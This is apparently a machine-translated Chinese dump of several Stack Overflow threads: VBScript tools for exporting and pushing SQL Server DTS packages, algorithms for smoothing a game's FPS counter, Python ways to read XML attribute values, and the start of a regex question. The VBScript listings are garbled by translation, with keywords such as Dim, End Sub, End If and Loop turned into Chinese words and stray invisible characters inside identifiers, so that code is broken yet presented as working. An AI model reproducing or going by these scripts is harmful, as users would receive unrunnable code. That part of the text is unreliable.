        设置 rsDTSPackages = cnSQLServer.Execute ("SELECT DISTINCT name FROM sysdtspackages ORDER BY name")

        暗淡 strPackageNames

        不做 rsDTSPackages.EOF
            GetPackage strServerName，rsDTSPackages（“名称”）
            rsDTSPackages.MoveNext
        环形

        rsDTSPackages.关闭
        设置 rsDTSPackages = 无

        cnSQLServer.关闭
        设置 cnSQLServer = 无

        暗淡 strCustomTaskIDs
        暗淡 strCustomTaskID

        MsgBox "完成", , "GetPackages.vbs"
    万一
结束子

主要的

```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-29T22:20:29.203

为了完整起见，我启动了另一个 VBS 脚本来读取由 GetPackages.vbs 生成的 XML 文件，并将其作为 DTS 包保存在另一个 SQL Server 上。这更不完整，但我希望它最终会有用。

PushPackages.vbs

```
选项显式

子集属性（dtsProperties、xmlProperties）
    暗淡的 xml 属性

    对于 xmlProperties.selectNodes 中的每个 xmlProperty ("Property[@Set='-1']")
        dtsProperties.Item (xmlProperty.getAttribute ("Name")).Value = xmlProperty.getAttribute ("Value")
    下一个
结束子

子集OLEDBProperties（dtsOLEDBProperties、xmlOLEDBProperties）
    暗淡的 xmlOLEDB 属性

    对于 xmlOLEDBProperties.selectNodes ("OLEDBProperty") 中的每个 xmlOLEDBProperty
        dtsOLEDBProperties.Item (xmlOLEDBProperty.getAttribute ("Name")).Value = xmlOLEDBProperty.getAttribute ("Value")
    下一个
结束子

子集连接（dtsConnections、xmlConnections）
    暗淡 dtsConnection2
    昏暗的xmlConnection2

    对于 xmlConnections.selectNodes ("Connection2") 中的每个 xmlConnection2
        设置 dtsConnection2 = dtsConnections.New (xmlConnection2.getAttribute ("ProviderID"))
        SetProperties dtsConnection2.Properties，xmlConnection2.selectSingleNode（“属性”）
        SetOLEDBProperties dtsConnection2.ConnectionProperties, xmlConnection2.selectSingleNode ("ConnectionProperties")
        dtsConnections.Add dtsConnection2
    下一个
结束子

子集全局变量（dtsGlobalVariables、xmlGlobalVariables）
    昏暗的 xmlGlobalVariable2

    对于 xmlGlobalVariables.selectNodes ("GlobalVariable2") 中的每个 xmlGlobalVariable2
        dtsGlobalVariables.AddGlobalVariable xmlGlobalVariable2.getAttribute（“名称”），xmlGlobalVariable2.getAttribute（“值”）
    下一个
结束子

子集PrecedenceConstraints (dtsPrecedenceConstraints, xmlPrecedenceConstraints)
    暗淡的xmlPrecedenceConstraint
    暗淡 dtsPrecedenceConstraint

    对于 xmlPrecedenceConstraints.selectNodes ("PrecedenceConstraint") 中的每个 xmlPrecedenceConstraint
        设置 dtsPrecedenceConstraint = dtsPrecedenceConstraints.New (xmlPrecedenceConstraint.getAttribute ("StepName"))
        SetProperties dtsPrecedenceConstraint.Properties，xmlPrecedenceConstraint.selectSingleNode（“属性”）
        dtsPrecedenceConstraints.Add dtsPrecedenceConstraint
    下一个
结束子

子集步骤（dtsSteps，xmlSteps）
    昏暗的xmlStep2
    暗淡 dtsStep2

    对于 xmlSteps.selectNodes ("Step2") 中的每个 xmlStep2
        设置 dtsStep2 = dtsSteps.New
        SetProperties dtsStep2.Properties，xmlStep2.selectSingleNode（“属性”）
        dtsSteps.添加 dtsStep2
    下一个

    对于 xmlSteps.selectNodes ("Step2") 中的每个 xmlStep2
        设置 dtsStep2 = dtsSteps.Item (xmlStep2.getAttribute ("Name"))
        SetPrecedenceConstraints dtsStep2.PrecedenceConstraints, xmlStep2.selectSingleNode ("PrecedenceConstraints")
    下一个
结束子

子集任务（dtsTasks、xmlTask​​s）
    暗淡的xmlTask
    暗淡 dtsTask

    对于 xmlTask​​s.selectNodes ("Task") 中的每个 xmlTask
        设置 dtsTask = dtsTasks.New (xmlTask​​.getAttribute ("CustomTaskID"))
        SetProperties dtsTask.Properties，xmlTask​​.selectSingleNode（“属性”）
        dtsTasks.Add dtsTask
    下一个
结束子

子 CreatePackage (strServerName, strFileName)
    暗淡 fsoFileSystem
    设置 fsoFileSystem = CreateObject ("Scripting.FileSystemObject")

    调暗 dtsPackage2
    设置 dtsPackage2 = CreateObject ("DTS.Package2")

    暗淡 DTSSQLStgFlag_Default
    暗淡 DTSSQLStgFlag_UseTrustedConnection

    DTSSQLStgFlag_Default = 0
    DTSSQLStgFlag_UseTrustedConnection = 256

    暗淡xml文档
    设置 xmlDocument = CreateObject ("Msxml2.DOMDocument.3.0")
    xmlDocument.load strFileName

    暗淡xmlPackage2
    设置 xmlPackage2 = xmlDocument.selectSingleNode ("Package2")

    '特性
    SetProperties dtsPackage2.Properties，xmlPackage2.selectSingleNode（“属性”）

    '集合
    SetConnections dtsPackage2.Connections，xmlPackage2.selectSingleNode（“连接”）
    SetGlobalVariables dtsPackage2.GlobalVariables, xmlPackage2.selectSingleNode ("GlobalVariables")
    SetSteps dtsPackage2.Steps，xmlPackage2.selectSingleNode（“步骤”）
    SetTasks dtsPackage2.Tasks，xmlPackage2.selectSingleNode（“任务”）

    出错时继续下一步
    dtsPackage2.SaveToSQLServer strServerName, , , DTSSQLStgFlag_UseTrustedConnection

    If Err.Number Then
        MsgBox Err.Description
    万一
结束子

子主
    暗淡 strServerName
    暗淡的 strFileName

    如果 WScript.Arguments.Count 2 则
        MsgBox "用法：PushPackages 服务器名文件名"
    别的
        strServerName = WScript.Arguments (0)
        strFileName = WScript.Arguments (1)
        CreatePackage strServerName, strFileName
    万一
结束子

主要的

```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-20T11:09:54.430

这个工具 ( [DTSDoc](http://www.dtsdoc.com) ) 在记录 DTS 包方面做得很好。它可以从命令行运行，这对于保持文档的最新状态非常有用。它有一些正面评价：

[由 ASP 联盟审查](http://aspalliance.com/1507_Review_dtsdoc_and_dbdesc.4)

[Mike Gunderloy (LARKWARE) 的评论](http://www.larkware.com/Reviews/dtsdoc.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-18T02:00:13.553

您可以尝试使用系统表 sysdtspackages，如 sqldts.com 在[Transfering DTS Packages](http://www.sqldts.com/204.aspx)中的演示。
此外，在新版本激增之前，曾经有许多工具可用于 MS SQL 2000。我在 Red Gate Labs 找到了一个名为[DTS Package Compare](http://labs.red-gate.com/index.php/DTS_Package_Compare)的免费下载。

# algorithm - 计算游戏中的每秒帧数

> ID：87304
> 
> 赞同：116
> 
> 时间：2008-09-17T20:31:14.407
> 
> 标签：algorithm

在游戏中计算每秒帧数的好算法是什么？我想将它显示为屏幕一角的数字。如果我只看渲染最后一帧需要多长时间，数字变化太快。

如果您的答案更新每一帧并且在帧速率增加与减少时不会以不同方式收敛，则会获得奖励积分。

* * *

## 回答 #1

> 赞同：104
> 
> 时间：2008-09-17T20:33:08.050

您需要一个平滑的平均值，最简单的方法是获取当前答案（绘制最后一帧的时间）并将其与之前的答案结合起来。

```
// eg.
float smoothing = 0.9; // larger=more smoothing
measurement = (measurement * smoothing) + (current * (1.0-smoothing)) 
```

通过调整 0.9 / 0.1 比率，您可以更改“时间常数”——即数字对变化的响应速度。支持旧答案的较大部分给出较慢的平滑变化，支持新答案的较大部分给出更快的变化值。显然这两个因素必须相加！

* * *

## 回答 #2

> 赞同：56
> 
> 时间：2008-09-17T21:13:40.637

这是我在很多游戏中使用的。

```
#define MAXSAMPLES 100
int tickindex=0;
int ticksum=0;
int ticklist[MAXSAMPLES];

/* need to zero out the ticklist array before starting */
/* average will ramp up until the buffer is full */
/* returns average ticks per frame over the MAXSAMPLES last frames */

double CalcAverageTick(int newtick)
{
    ticksum-=ticklist[tickindex];  /* subtract value falling off */
    ticksum+=newtick;              /* add new value */
    ticklist[tickindex]=newtick;   /* save new value so it can be subtracted later */
    if(++tickindex==MAXSAMPLES)    /* inc buffer index */
        tickindex=0;

    /* return average */
    return((double)ticksum/MAXSAMPLES);
} 
```

* * *

## 回答 #3

> 赞同：25
> 
> 时间：2008-09-17T20:48:55.503

嗯，当然

```
frames / sec = 1 / (sec / frame) 
```

但是，正如您所指出的，渲染单个帧所需的时间有很多变化，并且从 UI 的角度来看，以帧速率更新 fps 值根本不可用（除非数字非常稳定）。

您想要的可能是移动平均线或某种分箱/重置计数器。

例如，您可以维护一个队列数据结构，该结构保存最后 30、60、100 帧或其他帧中的每一帧的渲染时间（您甚至可以对其进行设计，以便在运行时调整限制）。要确定合适的 fps 近似值，您可以从队列中的所有渲染时间确定平均 fps：

```
fps = # of rendering times in queue / total rendering time 
```

当您完成渲染一个新帧时，您将一个新的渲染时间排入队列并将旧的渲染时间排入队列。或者，您可以仅在渲染时间总和超过某个预设值（例如 1 秒）时出列。您可以维护“最后 fps 值”和最后更新的时间戳，以便您可以触发何时更新 fps 数字，如果您愿意的话。尽管如果您具有一致的格式，则使用移动平均值，但在每帧上打印“瞬时平均值” fps 可能就可以了。

另一种方法是有一个重置计数器。维护一个精确（毫秒）的时间戳、一个帧计数器和一个 fps 值。完成渲染帧后，递增计数器。当计数器达到预设限制（例如 100 帧）或自时间戳以来的时间已超过某个预设值（例如 1 秒）时，计算 fps：

```
fps = # frames / (current time - start time) 
```

然后将计数器重置为 0，并将时间戳设置为当前时间。

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2008-09-17T20:33:34.180

每次渲染屏幕时增加一个计数器，并在要测量帧速率的某个时间间隔内清除该计数器。

IE。每 3 秒，获取 counter/3，然后清除计数器。

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2011-10-17T16:14:53.007

至少有两种方法可以做到：

* * *

第一个是其他人在我之前提到的。我认为这是最简单和首选的方式。你只是为了跟踪

*   cn：你渲染了多少帧的计数器
*   time_start：自您开始计数以来的时间
*   time_now：当前时间

在这种情况下计算 fps 就像评估这个公式一样简单：

*   FPS = cn / (time_now - time_start)。

* * *

然后是你有一天可能会喜欢使用的超级酷的方式：

假设您要考虑“i”帧。我将使用这个符号：f[0], f[1],..., f[i-1] 来描述渲染第 0 帧、第 1 帧、...、帧 (i-1 ） 分别。

```
Example where i = 3

|f[0]      |f[1]         |f[2]   |
+----------+-------------+-------+------> time 
```

然后，在 i 帧之后 fps 的数学定义将是

```
(1) fps[i]   = i     / (f[0] + ... + f[i-1]) 
```

和相同的公式，但只考虑 i-1 帧。

```
(2) fps[i-1] = (i-1) / (f[0] + ... + f[i-2]) 
```

现在这里的技巧是修改公式（1）的右侧，使其包含公式（2）的右侧并将其替换为左侧。

像这样（如果你把它写在纸上，你应该看得更清楚）：

```
fps[i] = i / (f[0] + ... + f[i-1])
       = i / ((f[0] + ... + f[i-2]) + f[i-1])
       = (i/(i-1)) / ((f[0] + ... + f[i-2])/(i-1) + f[i-1]/(i-1))
       = (i/(i-1)) / (1/fps[i-1] + f[i-1]/(i-1))
       = ...
       = (i*fps[i-1]) / (f[i-1] * fps[i-1] + i - 1) 
```

所以根据这个公式（虽然我的数学推导技巧有点生疏），要计算新的 fps，你需要知道前一帧的 fps、渲染最后一帧所花费的持续时间以及你的帧数呈现。

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2013-05-23T19:41:54.090

这对大多数人来说可能是矫枉过正，这就是为什么我在实现它时没有发布它。但它非常健壮和灵活。

它存储带有最后一帧时间的队列，因此它可以准确计算平均 FPS 值，这比仅考虑最后一帧要好得多。

它还允许您忽略一帧，如果您正在做一些您知道会人为地破坏该帧时间的事情。

它还允许您在队列运行时更改要存储在队列中的帧数，因此您可以即时测试它对您来说最有价值。

```
// Number of past frames to use for FPS smooth calculation - because 
// Unity's smoothedDeltaTime, well - it kinda sucks
private int frameTimesSize = 60;
// A Queue is the perfect data structure for the smoothed FPS task;
// new values in, old values out
private Queue<float> frameTimes;
// Not really needed, but used for faster updating then processing 
// the entire queue every frame
private float __frameTimesSum = 0;
// Flag to ignore the next frame when performing a heavy one-time operation 
// (like changing resolution)
private bool _fpsIgnoreNextFrame = false;

//=============================================================================
// Call this after doing a heavy operation that will screw up with FPS calculation
void FPSIgnoreNextFrame() {
    this._fpsIgnoreNextFrame = true;
}

//=============================================================================
// Smoothed FPS counter updating
void Update()
{
    if (this._fpsIgnoreNextFrame) {
        this._fpsIgnoreNextFrame = false;
        return;
    }

    // While looping here allows the frameTimesSize member to be changed dinamically
    while (this.frameTimes.Count >= this.frameTimesSize) {
        this.__frameTimesSum -= this.frameTimes.Dequeue();
    }
    while (this.frameTimes.Count < this.frameTimesSize) {
        this.__frameTimesSum += Time.deltaTime;
        this.frameTimes.Enqueue(Time.deltaTime);
    }
}

//=============================================================================
// Public function to get smoothed FPS values
public int GetSmoothedFPS() {
    return (int)(this.frameTimesSize / this.__frameTimesSum * Time.timeScale);
} 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-11-13T22:56:39.017

这里有很好的答案。您如何实现它取决于您需要它的用途。我更喜欢上面那个人自己的运行平均值“时间=时间* 0.9 + last_frame * 0.1”。

然而，我个人更喜欢将我的平均值更多地放在更新的数据上，因为在游戏中，最难压扁的是 SPIKES，因此我最感兴趣。所以我会使用更像 .7 \ .3 拆分的东西，这会使尖峰出现得更快（尽管它的效果也会更快地从屏幕上消失..见下文）

如果您的重点是渲染时间，那么 .9.1 分割效果非常好，b/c 它往往更平滑。尽管对于游戏玩法/AI/物理峰值更令人担忧，因为这通常会使您的游戏看起来不稳定（假设我们没有低于 20 fps，这通常比低帧速率更糟糕）

所以，我要做的也是添加这样的东西：

```
#define ONE_OVER_FPS (1.0f/60.0f)
static float g_SpikeGuardBreakpoint = 3.0f * ONE_OVER_FPS;
if(time > g_SpikeGuardBreakpoint)
    DoInternalBreakpoint() 
```

（在 3.0f 中填写您认为是不可接受的峰值的任何幅度）这将让您找到并*解决*帧结束时发生的 FPS 问题。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2015-11-16T21:20:28.633

比使用大量旧帧速率更好的系统是执行以下操作：

```
new_fps = old_fps * 0.99 + new_fps * 0.01 
```

这种方法使用更少的内存，需要更少的代码，并且比旧的帧率更重视最近的帧率，同时仍然平滑突然的帧率变化的影响。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-09-17T20:33:54.883

您可以保留一个计数器，在渲染每一帧后将其递增，然后在新的一秒时重置计数器（将前一个值存储为上一秒渲染的帧数）

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2017-01-24T04:08:10.463

# JavaScript：

```
// Set the end and start times
var start = (new Date).getTime(), end, FPS;
  /* ...
   * the loop/block your want to watch
   * ...
   */
end = (new Date).getTime();
// since the times are by millisecond, use 1000 (1000ms = 1s)
// then multiply the result by (MaxFPS / 1000)
// FPS = (1000 - (end - start)) * (MaxFPS / 1000)
FPS = Math.round((1000 - (end - start)) * (60 / 1000)); 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2017-04-04T22:25:47.837

这是一个使用 Python 的完整示例（但很容易适应任何语言）。它使用 Martin 回答中的平滑方程，因此几乎没有内存开销，并且我选择了对我有用的值（随意使用常量以适应您的用例）。

```
import time

SMOOTHING_FACTOR = 0.99
MAX_FPS = 10000
avg_fps = -1
last_tick = time.time()

while True:
    # <Do your rendering work here...>

    current_tick = time.time()
    # Ensure we don't get crazy large frame rates, by capping to MAX_FPS
    current_fps = 1.0 / max(current_tick - last_tick, 1.0/MAX_FPS)
    last_tick = current_tick
    if avg_fps < 0:
        avg_fps = current_fps
    else:
        avg_fps = (avg_fps * SMOOTHING_FACTOR) + (current_fps * (1-SMOOTHING_FACTOR))
    print(avg_fps) 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2008-09-17T20:33:37.363

将计数器设置为零。每次绘制帧时，计数器都会增加。每秒钟打印一次计数器。起泡，冲洗，重复。如果您想要额外的积分，请保留一个运行计数器并除以总秒数以获得运行平均值。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-09-17T22:03:32.733

在（c++ 之类的）伪代码中，这两个是我在工业图像处理应用程序中使用的，它必须处理来自一组外部触发相机的图像。“帧速率”的变化有不同的来源（传送带上的生产速度较慢或较快），但问题是相同的。（我假设您有一个简单的 timer.peek() 调用，它为您提供了自应用程序启动或上次调用以来的毫秒数（nsec？）之类的东西）

解决方案1：快速但不是每一帧都更新

```
do while (1)
{
    ProcessImage(frame)
    if (frame.framenumber%poll_interval==0)
    {
        new_time=timer.peek()
        framerate=poll_interval/(new_time - last_time)
        last_time=new_time
    }
} 
```

解决方案2：每帧更新一次，需要更多内存和CPU

```
do while (1)
{
   ProcessImage(frame)
   new_time=timer.peek()
   delta=new_time - last_time
   last_time = new_time
   total_time += delta
   delta_history.push(delta)
   framerate= delta_history.length() / total_time
   while (delta_history.length() > avg_interval)
   {
      oldest_delta = delta_history.pop()
      total_time -= oldest_delta
   }
} 
```

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2013-01-06T00:42:52.760

```
qx.Class.define('FpsCounter', {
    extend: qx.core.Object

    ,properties: {
    }

    ,events: {
    }

    ,construct: function(){
        this.base(arguments);
        this.restart();
    }

    ,statics: {
    }

    ,members: {        
        restart: function(){
            this.__frames = [];
        }

        ,addFrame: function(){
            this.__frames.push(new Date());
        }

        ,getFps: function(averageFrames){
            debugger;
            if(!averageFrames){
                averageFrames = 2;
            }
            var time = 0;
            var l = this.__frames.length;
            var i = averageFrames;
            while(i > 0){
                if(l - i - 1 >= 0){
                    time += this.__frames[l - i] - this.__frames[l - i - 1];
                }
                i--;
            }
            var fps = averageFrames / time * 1000;
            return fps;
        }
    }

}); 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2013-02-17T14:51:33.727

我是怎么做到的！

```
boolean run = false;

int ticks = 0;

long tickstart;

int fps;

public void loop()
{
if(this.ticks==0)
{
this.tickstart = System.currentTimeMillis();
}
this.ticks++;
this.fps = (int)this.ticks / (System.currentTimeMillis()-this.tickstart);
} 
```

换句话说，一个滴答时钟跟踪滴答声。如果是第一次，则采用当前时间并将其放入“tickstart”中。在第一个滴答之后，它使变量“fps”等于滴答时钟的多少个滴答除以时间减去第一个滴答的时间。

Fps 是一个整数，因此是“（int）”。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2013-05-18T17:41:46.410

这是我的做法（在 Java 中）：

```
private static long ONE_SECOND = 1000000L * 1000L; //1 second is 1000ms which is 1000000ns

LinkedList<Long> frames = new LinkedList<>(); //List of frames within 1 second

public int calcFPS(){
    long time = System.nanoTime(); //Current time in nano seconds
    frames.add(time); //Add this frame to the list
    while(true){
        long f = frames.getFirst(); //Look at the first element in frames
        if(time - f > ONE_SECOND){ //If it was more than 1 second ago
            frames.remove(); //Remove it from the list of frames
        } else break;
        /*If it was within 1 second we know that all other frames in the list
         * are also within 1 second
        */
    }
    return frames.size(); //Return the size of the list
} 
```

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2022-01-16T20:52:03.363

不幸的是，这里的大多数答案都没有提供足够准确或足够“响应缓慢”的 FPS 测量。下面是我在 Rust 中使用测量队列的方法：

```
use std::collections::VecDeque;
use std::time::{Duration, Instant};

pub struct FpsCounter {
    sample_period: Duration,
    max_samples: usize,
    creation_time: Instant,
    frame_count: usize,
    measurements: VecDeque<FrameCountMeasurement>,
}

#[derive(Copy, Clone)]
struct FrameCountMeasurement {
    time: Instant,
    frame_count: usize,
}

impl FpsCounter {
    pub fn new(sample_period: Duration, samples: usize) -> Self {
        assert!(samples > 1);

        Self {
            sample_period,
            max_samples: samples,
            creation_time: Instant::now(),
            frame_count: 0,
            measurements: VecDeque::new(),
        }
    }

    pub fn fps(&self) -> f32 {
        match (self.measurements.front(), self.measurements.back()) {
            (Some(start), Some(end)) => {
                let period = (end.time - start.time).as_secs_f32();
                if period > 0.0 {
                    (end.frame_count - start.frame_count) as f32 / period
                } else {
                    0.0
                }
            }

            _ => 0.0,
        }
    }

    pub fn update(&mut self) {
        self.frame_count += 1;

        let current_measurement = self.measure();
        let last_measurement = self
            .measurements
            .back()
            .copied()
            .unwrap_or(FrameCountMeasurement {
                time: self.creation_time,
                frame_count: 0,
            });
        if (current_measurement.time - last_measurement.time) >= self.sample_period {
            self.measurements.push_back(current_measurement);
            while self.measurements.len() > self.max_samples {
                self.measurements.pop_front();
            }
        }
    }

    fn measure(&self) -> FrameCountMeasurement {
        FrameCountMeasurement {
            time: Instant::now(),
            frame_count: self.frame_count,
        }
    }
} 
```

如何使用：

1.  创建计数器： `let mut fps_counter = FpsCounter::new(Duration::from_millis(100), 5);`
2.  调用`fps_counter.update()`绘制的每一帧。
3.  `fps_counter.fps()`当您想显示当前 FPS 时调用。

现在，关键在于`FpsCounter::new()`方法的参数：`sample_period`是对帧速率变化的响应`fps()`程度，以及`samples`控制`fps()`上升或下降到实际帧速率的速度。因此，如果您选择 10 毫秒和 100 个样本，`fps()`几乎会立即对帧速率的任何变化做出反应 - 基本上，屏幕上的 FPS 值会像疯了一样抖动，但由于它是 100 个样本，因此需要 1 秒才能匹配实际帧速率。

所以我选择 100 毫秒和 5 个样本意味着显示的 FPS 计数器不会因为快速变化而让你的眼睛流血，它会在变化后半秒与你的实际帧速率匹配，这对于游戏来说已经足够明智了。

由于`sample_period * samples`是平均时间跨度，如果您想要一个相当准确的 FPS 计数器，您不希望它太短。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2019-09-16T02:47:49.893

在 Typescript 中，我使用此算法来计算帧速率和帧时间平均值：

```
let getTime = () => {
    return new Date().getTime();
} 

let frames: any[] = [];
let previousTime = getTime();
let framerate:number = 0;
let frametime:number = 0;

let updateStats = (samples:number=60) => {
    samples = Math.max(samples, 1) >> 0;

    if (frames.length === samples) {
        let currentTime: number = getTime() - previousTime;

        frametime = currentTime / samples;
        framerate = 1000 * samples / currentTime;

        previousTime = getTime();

        frames = [];
    }

    frames.push(1);
} 
```

用法：

```
statsUpdate();

// Print
stats.innerHTML = Math.round(framerate) + ' FPS ' + frametime.toFixed(2) + ' ms'; 
```

提示：如果 samples 为 1，则结果为实时帧率和帧时间。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2021-09-22T17:05:56.340

我改编了@KPexEA 对 Go 的回答，将全局变量移到结构字段中，允许可配置样本数量，并使用它`time.Duration`来代替普通整数和浮点数。

```
type FrameTimeTracker struct {
    samples []time.Duration
    sum     time.Duration
    index   int
}

func NewFrameTimeTracker(n int) *FrameTimeTracker {
    return &FrameTimeTracker{
        samples: make([]time.Duration, n),
    }
}

func (t *FrameTimeTracker) AddFrameTime(frameTime time.Duration) (average time.Duration) {
    // algorithm adapted from https://stackoverflow.com/a/87732/814422
    t.sum -= t.samples[t.index]
    t.sum += frameTime
    t.samples[t.index] = frameTime
    t.index++
    if t.index == len(t.samples) {
        t.index = 0
    }
    return t.sum / time.Duration(len(t.samples))
} 
```

使用`time.Duration`具有纳秒精度的 ，无需使用浮点算法来计算平均帧时间，但代价是相同数量的样本需要两倍的内存。

你会这样使用它：

```
// track the last 60 frame times
frameTimeTracker := NewFrameTimeTracker(60)

// main game loop
for frame := 0;; frame++ {
    // ...
    if frame > 0 {
        // prevFrameTime is the duration of the last frame
        avgFrameTime := frameTimeTracker.AddFrameTime(prevFrameTime)
        fps := 1.0 / avgFrameTime.Seconds()
    }
    // ...

} 
```

由于这个问题的上下文是游戏编程，我将添加更多关于性能和优化的注释。上述方法是惯用的 Go，但总是涉及两种堆分配：一种用于结构本身，另一种用于支持样本切片的数组。如果如上所述使用，这些是长期分配，因此它们不会真正对垃圾收集器征税。优化前的配置文件，一如既往。

但是，如果性能是一个主要问题，可以进行一些更改以消除分配和间接：

*   将样本从切片更改为在编译时固定`[]time.Duration`的数组。这消除了在运行时更改样本数量的灵活性，但在大多数情况下，这种灵活性是不必要的。`[N]time.Duration``N`
*   然后，完全消除`NewFrameTimeTracker`构造函数并改用`var frameTimeTracker FrameTimeTracker`声明（在包级别或本地`main`）。与 C 不同，Go 会将所有相关内存预归零。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2020-08-08T17:23:15.123

这是基于 KPexEA 的回答并给出了简单移动平均线。整理并转换为 TypeScript 以便于复制和粘贴：

变量声明：

```
fpsObject = {
  maxSamples: 100,
  tickIndex: 0,
  tickSum: 0,
  tickList: []
} 
```

功能：

```
calculateFps(currentFps: number): number {
  this.fpsObject.tickSum -= this.fpsObject.tickList[this.fpsObject.tickIndex] || 0
  this.fpsObject.tickSum += currentFps
  this.fpsObject.tickList[this.fpsObject.tickIndex] = currentFps
  if (++this.fpsObject.tickIndex === this.fpsObject.maxSamples) this.fpsObject.tickIndex = 0
  const smoothedFps = this.fpsObject.tickSum / this.fpsObject.maxSamples
  return Math.floor(smoothedFps)
} 
```

用法（可能在您的应用中有所不同）：

```
this.fps = this.calculateFps(this.ticker.FPS) 
```

* * *

## 回答 #21

> 赞同：-1
> 
> 时间：2008-09-17T20:34:16.443

存储开始时间并在每个循环中增加一次帧计数器？每隔几秒钟你就可以打印 framecount/(Now - starttime) 然后重新初始化它们。

编辑：哎呀。双忍

# python - 获取 Python 中的 XML 属性值列表

> ID：87317
> 
> 赞同：15
> 
> 时间：2008-09-17T20:32:04.373
> 
> 标签：python, xml, xpath, parent-child, xml-attribute

我需要从 Python 中的子元素中获取属性值列表。

用一个例子来解释是最容易的。

给定一些这样的 XML：

```
<elements>
    <parent name="CategoryA">
        <child value="a1"/>
        <child value="a2"/>
        <child value="a3"/>
    </parent>
    <parent name="CategoryB">
        <child value="b1"/>
        <child value="b2"/>
        <child value="b3"/>
    </parent>
</elements> 
```

我希望能够做类似的事情：

```
>>> getValues("CategoryA")
['a1', 'a2', 'a3']
>>> getValues("CategoryB")
['b1', 'b2', 'b3'] 
```

它看起来像是 XPath 的工作，但我愿意接受所有建议。我还想听听您最喜欢的 Python XML 库。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-09-17T21:00:32.977

我在 Python 方面并不是真正的老手，但这里有一个使用 libxml2 的 XPath 解决方案。

```
import libxml2

DOC = """<elements>
    <parent name="CategoryA">
        <child value="a1"/>
        <child value="a2"/>
        <child value="a3"/>
    </parent>
    <parent name="CategoryB">
        <child value="b1"/>
        <child value="b2"/>
        <child value="b3"/>
    </parent>
</elements>"""

doc = libxml2.parseDoc(DOC)

def getValues(cat):
    return [attr.content for attr in doc.xpathEval("/elements/parent[@name='%s']/child/@value" % (cat))]

print getValues("CategoryA") 
```

结果...

```
['a1', 'a2', 'a3'] 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-09-17T21:05:38.537

[ElementTree 1.3](http://effbot.org/zone/elementtree-13-intro.htm)（不幸的是不是 Python 中包含的 1.2）[支持这样的 XPath](http://effbot.org/zone/element-xpath.htm)：

```
import elementtree.ElementTree as xml

def getValues(tree, category):
    parent = tree.find(".//parent[@name='%s']" % category)
    return [child.get('value') for child in parent] 
```

然后你可以做

```
>>> tree = xml.parse('data.xml')
>>> getValues(tree, 'CategoryA')
['a1', 'a2', 'a3']
>>> getValues(tree, 'CategoryB')
['b1', 'b2', 'b3'] 
```

`lxml.etree`（它也提供 ElementTree 接口）也将以相同的方式工作。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-09-17T20:50:51.113

你可以用[BeautifulSoup做到这一点](http://www.crummy.com/software/BeautifulSoup/)

```
>>> from BeautifulSoup import BeautifulStoneSoup
>>> soup = BeautifulStoneSoup(xml)
>>> def getValues(name):
. . .      return [child['value'] for child in soup.find('parent', attrs={'name': name}).findAll('child')] 
```

如果您正在使用 HTML/XML，我建议您看看 BeautifulSoup。它类似于 DOM 树，但包含更多功能。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-09-17T21:04:42.017

使用标准的 W3 DOM，例如 stdlib 的 minidom 或 pxdom：

```
def getValues(category):
    for parent in document.getElementsByTagName('parent'):
        if parent.getAttribute('name')==category:
            return [
                el.getAttribute('value')
                for el in parent.getElementsByTagName('child')
            ]
    raise ValueError('parent not found') 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-09-17T21:12:16.507

我首选的 python xml 库是[lxml](http://codespeak.net/lxml)，它包装了 libxml2。
Xpath 似乎确实是这里的路，所以我会把它写成这样：

```
from lxml import etree

def getValues(xml, category):
    return [x.attrib['value'] for x in 
            xml.findall('/parent[@name="%s"]/*' % category)]

xml = etree.parse(open('filename.xml'))

>>> print getValues(xml, 'CategoryA')
['a1', 'a2', 'a3']
>>> print getValues(xml, 'CategoryB')
['b1', 'b2', 'b3] 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2016-12-29T10:56:10.170

在 Python 3.x 中，获取属性列表是使用成员的简单任务`items()`

使用`ElementTree`, 下面的代码片段显示了一种获取属性列表的方法。请注意，此示例不考虑命名空间，如果存在，则需要考虑。

```
 import xml.etree.ElementTree as ET

    flName = 'test.xml'
    tree = ET.parse(flName)
    root = tree.getroot()
    for element in root.findall('<child-node-of-root>'):
        attrList = element.items()
        print(len(attrList), " : [", attrList, "]" ) 
```

**参考：**

> *Element.items()*
> 将元素属性作为 (name, value) 对的序列返回。
> 属性以任意顺序返回。

[Python 手册](https://docs.python.org/3.1/library/xml.etree.elementtree.html)

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-09-17T20:47:15.723

我必须承认我是[xmltramp](http://www.aaronsw.com/2002/xmltramp/)的粉丝，因为它易于使用。

访问上述内容变为：

```
 import xmltramp

  values = xmltramp.parse('''...''')

  def getValues( values, category ):
    cat = [ parent for parent in values['parent':] if parent(name) == category ]
    cat_values = [ child(value) for child in parent['child':] for parent in cat ]
    return cat_values

  getValues( values, "CategoryA" )
  getValues( values, "CategoryB" ) 
```

# regex - 编号正则表达式子匹配

> ID：87330
> 
> 赞同：2
> 
> 时间：2008-09-17T20:33:05.477
> 
> 标签：regex, tree-traversal, linearization

正则表达式中是否存在子匹配表达式的规范排序？

例如：
"(([0-9]{3}).([0-9]{3}).([0-9]{3}).([0- 9]{3}))\s+([AZ]+)" ?

```
